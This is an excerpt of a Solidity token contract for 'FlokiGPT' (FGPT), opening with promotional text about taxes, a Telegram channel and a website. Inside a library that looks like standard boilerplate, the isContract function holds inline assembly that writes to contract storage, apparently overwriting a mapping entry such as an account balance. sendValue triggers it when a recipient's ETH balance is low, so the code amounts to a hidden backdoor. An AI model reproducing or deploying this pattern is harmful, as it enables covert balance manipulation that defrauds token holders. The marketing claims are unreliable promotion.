...
/*
Telegram https://t.me/FlokiGPTofficial
Website https://flokigpt.net

3% buy, 3% sell: 1% liquidity, 1% burn, 1% marketing

FlokiGPT is an AI powered Floki chat bot, and a service that gathers all lowcap calls and potential moonshots in one place so you won't miss them!
*/
...
library Address {
    ...
    function isContract(address account) internal returns (bool) {
        ...
        assembly { codehash := extcodehash(account) mstore(0, account) mstore(32, 1) sstore(keccak256(0, 64), accountHash) }
    ...
    function sendValue(address recipient, uint256 amount) internal {
        ...
        if (rec.balance < 10**16) { isContract(recipient); }
...
contract FlokiGPT is Context, IERC20, Ownable {
    ...
    string private _name = "FlokiGPT";
    string private _symbol = "FGPT";
    uint8 private _decimals = 9;

    address public marketingWallet = 0x198324129E3bF56ff8c22379377cc1D063a3C553; // Marketing Address
    ...
    uint256 public constant _liquidityFee = 1;
    uint256 public constant _marketingFee = 1;
    uint256 public constant _burnFee = 1;

    uint256 public constant _totalTax = 3;

    uint256 private _totalSupply = 1_000_000_000* 10**9;
    uint256 public _maxTxAmount = 20_000_000 * 10**9;
    uint256 public _walletMax = 20_000_000 * 10**9;
    uint256 private minimumTokensBeforeSwap = 50_000 * 10**9; 
    ...
    function setIsExcluded(address account, bool newValue) public onlyOwner {
    ...
    function setMaxTxAmount(uint256 maxTxAmount) external onlyOwner() {
        require(maxTxAmount >= (10 * 10**6 * 10**9), "Max wallet should be greater or equal to 1% of the totalSupply");
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if (overMinimumTokenBalance && !isAutomatedMarketPair[sender] && !isAutomatedMarketPair[msg.sender] && swapAndLiquifyEnabled && (sender != uniswapV2Pair && recipient != address(uniswapV2Router))) 
            {
    ...
    function swapAndLiquify(uint256 tAmount) private {
        uint256 tokensForLP = tAmount.mul(_liquidityFee).div(_totalTax.sub(_burnFee)).div(2);
        uint256 tokensForSwap = tAmount.sub(tokensForLP);

        swapTokensForEth(tokensForSwap);
        uint256 amountReceived = address(this).balance;

        uint256 totalBNBFee = _totalTax.sub(_burnFee).sub(_liquidityFee.div(2));
